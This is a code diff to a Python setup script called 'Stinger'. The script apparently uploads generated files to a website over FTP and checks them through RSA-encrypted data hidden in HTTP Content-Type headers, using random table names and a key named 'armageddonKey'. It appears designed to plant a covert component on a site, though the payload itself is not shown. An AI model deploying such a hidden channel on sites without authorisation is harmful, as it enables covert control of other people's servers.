@@ -1,7 +1,7 @@
 # Setup Stinger
 
 # Libraries
-import ftplib, argparse, os, requests, rsa, threading
+import ftplib, argparse, os, requests, rsa, threading, random, string
 from jinja2 import Environment, FileSystemLoader
 
 # Parser Initialization
@@ -9,7 +9,7 @@ parser = argparse.ArgumentParser()
 
 # Website Arguments
 parser.add_argument("-site", help="Website Address", required=True)
-parser.add_argument("-ssl", help="Site SSL Encryption Set", required=False, default=True)
+parser.add_argument("-ssl", help="Site SSL Encryption Set (True/False)", required=False, default=True)
 
 # FTP Arguments
 parser.add_argument("-ftp", "--ftpServer", help="FTP Server Address", required=True)
@@ -48,8 +48,8 @@ try:
         
     # Database Variables
     print("Generating Variables & Keys")
-    tableName = os.urandom(16).hex() 
-    tableID = os.urandom(16).hex()
+    tableName = random.choice(string.ascii_letters) + (os.urandom(16).hex())
+    tableID = random.choice(string.ascii_letters) + (os.urandom(16).hex())
     tableBegin = int(str(os.urandom(6).hex()), 16)
     # Key Generation
     armageddonKey = os.urandom(16).hex()
@@ -141,19 +141,23 @@ try:
             # Check if get request was sent successfully
             if(request.status_code == 200):
                 # Get data and decrypt  
-                requestData = request.headers.get("Content-Type")
-                requestData = rsa.decrypt(bytes.fromhex(requestData), privateKey)
+                requestData = bytearray.fromhex(request.headers.get("Content-Type"))
+                requestData = rsa.decrypt(requestData, privateKey)
                 #  Check if test passed
                 if (requestData == testData):
                     print("Test successful")
                 else:
-                    print("Failed to sent GET request")   
+                    print("Failed Test")   
+                    exit(1)
             else:
-                print("Failed to sent POST request")
+                print("Failed to send Get request")
+                exit(1)
         else:
-            print("Test Failed")
+            print("Failed to send Post request")
+            exit(1)
     else:
         print("Failed to connect to website")
+        exit(1)
     
     # Create Stinger
     def createStinger(env):
